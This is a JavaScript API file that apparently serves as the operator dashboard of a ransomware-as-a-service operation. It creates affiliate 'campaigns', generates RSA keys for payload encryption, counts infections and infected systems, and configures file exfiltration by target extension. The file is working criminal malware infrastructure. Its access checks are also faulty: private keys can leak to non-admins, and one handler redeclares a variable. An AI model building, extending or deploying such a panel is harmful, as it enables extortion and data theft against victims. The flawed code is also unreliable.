// vercel-dashboard/api/campaigns/index.js
// Campaign/Key Management API (FIXED: actual RSA key generation)

import { kv } from '../../lib/kv.js';
import { verifyPayloadApiKey } from '../auth/middleware.js';

export default async function handler(request, response) {
  response.setHeader('Access-Control-Allow-Origin', '*');
  response.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  response.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (request.method === 'OPTIONS') return response.status(200).end();

  // Verify auth for mutating operations
  if (['POST', 'PUT', 'DELETE'].includes(request.method)) {
    const auth = await verifyPayloadApiKey(request);
    if (!auth.valid || auth.role !== 'admin') {
      return response.status(403).json({ error: 'Admin access required' });
    }
    request.auth = auth;
  }

  try {
    switch (request.method) {
      case 'GET':
        return await handleGet(request, response);
      case 'POST':
        return await handlePost(request, response);
      case 'PUT':
        return await handlePut(request, response);
      case 'DELETE':
        return await handleDelete(request, response);
      default:
        return response.status(405).json({ error: 'Method not allowed' });
    }
  } catch (error) {
    console.error('Campaigns API error:', error);
    return response.status(500).json({ error: 'Internal server error' });
  }
}

// GET /api/campaigns - List all campaigns
async function handleGet(request, response) {
  const { id, includeStats, includeKeys } = request.query;

  // Check auth for key access
  const auth = await verifyPayloadApiKey(request);
  const isAdmin = auth.valid && auth.role === 'admin';
  const campaignFilter = auth.valid && auth.role === 'campaign' ? auth.campaignId : null;

  if (id) {
    const campaign = await kv.get(`campaign:${id}`);
    if (!campaign) return response.status(404).json({ error: 'Campaign not found' });

    // Check access
    if (campaignFilter && campaign.id !== campaignFilter) {
      return response.status(403).json({ error: 'Access denied' });
    }

    // Include private keys only for admin
    if (!isAdmin && includeKeys === 'true') {
      delete campaign.privateKeyPem;
      delete campaign.privateKeyJwk;
    }

    if (includeStats === 'true') {
      const stats = await kv.hgetall(`campaign:${id}:stats`);
      const systems = await kv.smembers(`campaign:${id}:systems`) || [];
      campaign.stats = stats || {};
      campaign.systemCount = systems.length;
      campaign.systems = systems.slice(0, 50);
    }
    return response.json(campaign);
  }

  // List all campaigns
  let campaignIds = await kv.smembers('global:campaigns') || [];
  
  // Filter by campaign if not admin
  if (campaignFilter) {
    campaignIds = campaignIds.filter(id => id === campaignFilter);
  }

  const campaigns = [];

  for (const cid of campaignIds) {
    const c = await kv.get(`campaign:${cid}`);
    if (c) {
      // Never expose private keys in list view
      const { privateKeyPem, privateKeyJwk, ...safeCampaign } = c;
      
      const stats = await kv.hgetall(`campaign:${cid}:stats`);
      const systemCount = (await kv.scard(`campaign:${cid}:systems`)) || 0;
      campaigns.push({
        ...safeCampaign,
        stats: {
          totalInfections: parseInt(stats?.totalInfections || '0'),
          totalFiles: parseInt(stats?.totalFiles || '0'),
          totalBytes: parseInt(stats?.totalBytes || '0'),
          lastActivity: stats?.lastActivity
        },
        systemCount
      });
    }
  }

  campaigns.sort((a, b) => new Date(b.stats.lastActivity || 0) - new Date(a.stats.lastActivity || 0));

  response.json({ campaigns, total: campaigns.length });
}

// POST /api/campaigns - Create new campaign with RSA keys
async function handlePost(request, response) {
  const { name, description, apiKey, rsaKeySize = 4096, affiliateId } = request.body;

  if (!name) return response.status(400).json({ error: 'Campaign name required' });
  if (rsaKeySize !== 2048 && rsaKeySize !== 4096) {
    return response.status(400).json({ error: 'rsaKeySize must be 2048 or 4096' });
  }

  const id = `camp_${Date.now()}_${Math.random().toString(36).substring(7)}`;
  const generatedApiKey = apiKey || `ck_${Math.random().toString(36).substring(2, 15)}${Math.random().toString(36).substring(2, 10)}`;

  // Generate RSA key pair using Web Crypto API
  const keyPair = await generateRSAKeyPair(rsaKeySize);
  
  const campaign = {
    id,
    name,
    description: description || '',
    apiKey: generatedApiKey,
    rsaKeySize,
    status: 'active',
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
    affiliateId: affiliateId || null,
    // Public key for payload encryption
    publicKeyPem: keyPair.publicKeyPem,
    publicKeyJwk: keyPair.publicKeyJwk,
    // Private key for dashboard decryption (admin only)
    privateKeyPem: keyPair.privateKeyPem,
    privateKeyJwk: keyPair.privateKeyJwk,
    settings: {
      exfilEnabled: true,
      encryptionMode: 'Hybrid',
      maxFileSizeMB: 50,
      targetExtensions: ['.txt', '.doc', '.docx', '.pdf', '.sql', '.json', '.cs', '.py', '.js']
    }
  };

  const operations = [
    kv.set(`campaign:${id}`, campaign),
    kv.sadd('global:campaigns', id),
    kv.hset(`campaign:${id}:stats`, {
      totalInfections: 0,
      totalFiles: 0,
      totalBytes: 0,
      createdAt: campaign.createdAt
    })
  ];

  if (affiliateId) {
    operations.push(
      kv.sadd(`affiliate:${affiliateId}:campaigns`, id),
      kv.hincrby(`affiliate:${affiliateId}:stats`, 'totalCampaignsCreated', 1)
    );
  }

  await Promise.all(operations);

  // Return without private key unless admin
  const auth = await verifyPayloadApiKey(request);
  const { privateKeyPem, privateKeyJwk, ...safeResponse } = campaign;
  if (!(auth.valid && auth.role === 'admin')) {
    // Already stripped
  }

  response.status(201).json(safeResponse);
}

// PUT /api/campaigns - Update campaign
async function handlePut(request, response) {
  const { id, ...updates } = request.body;
  if (!id) return response.status(400).json({ error: 'Campaign ID required' });

  const existing = await kv.get(`campaign:${id}`);
  if (!existing) return response.status(404).json({ error: 'Campaign not found' });

  // Prevent changing keys
  const { privateKeyPem, privateKeyJwk, publicKeyPem, publicKeyJwk, apiKey, id: _, createdAt, ...allowedUpdates } = updates;

  const updated = {
    ...existing,
    ...allowedUpdates,
    id,
    updatedAt: new Date().toISOString()
  };

  await kv.set(`campaign:${id}`, updated);
  
  // Return without private keys
  const { privateKeyPem: _, privateKeyJwk: __, ...safeResponse } = updated;
  response.json(safeResponse);
}

// DELETE /api/campaigns - Delete campaign
async function handleDelete(request, response) {
  const { id } = request.query;
  if (!id) return response.status(400).json({ error: 'Campaign ID required' });

  const existing = await kv.get(`campaign:${id}`);
  if (!existing) return response.status(404).json({ error: 'Campaign not found' });

  const systems = await kv.smembers(`campaign:${id}:systems`) || [];
  const cleanup = [
    kv.del(`campaign:${id}`),
    kv.del(`campaign:${id}:stats`),
    kv.del(`campaign:${id}:systems`),
    kv.del(`campaign:${id}:daily:*`), // Pattern delete not supported, would need scan
    kv.srem('global:campaigns', id)
  ];

  for (const sysId of systems) {
    cleanup.push(kv.srem(`system:${sysId}:campaigns`, id));
  }

  await Promise.all(cleanup);
  response.json({ success: true, deleted: id });
}

// RSA Key Generation using Web Crypto API
async function generateRSAKeyPair(keySize) {
  const subtle = crypto.subtle;
  
  const keyPair = await subtle.generateKey(
    {
      name: 'RSA-OAEP',
      modulusLength: keySize,
      publicExponent: new Uint8Array([1, 0, 1]), // 65537
      hash: 'SHA-256'
    },
    true, // extractable
    ['encrypt', 'decrypt']
  );

  // Export public key as SPKI (PEM)
  const publicKeySpki = await subtle.exportKey('spki', keyPair.publicKey);
  const publicKeyPem = arrayBufferToPem(publicKeySpki, 'PUBLIC KEY');

  // Export private key as PKCS8 (PEM)
  const privateKeyPkcs8 = await subtle.exportKey('pkcs8', keyPair.privateKey);
  const privateKeyPem = arrayBufferToPem(privateKeyPkcs8, 'PRIVATE KEY');

  // Export as JWK for JSON compatibility
  const publicKeyJwk = await subtle.exportKey('jwk', keyPair.publicKey);
  const privateKeyJwk = await subtle.exportKey('jwk', keyPair.privateKey);

  return {
    publicKeyPem,
    privateKeyPem,
    publicKeyJwk,
    privateKeyJwk
  };
}

function arrayBufferToPem(buffer, type) {
  const base64 = btoa(String.fromCharCode(...new Uint8Array(buffer)));
  const lines = base64.match(/.{1,64}/g).join('\n');
  return `-----BEGIN ${type}-----\n${lines}\n-----END ${type}-----`;
}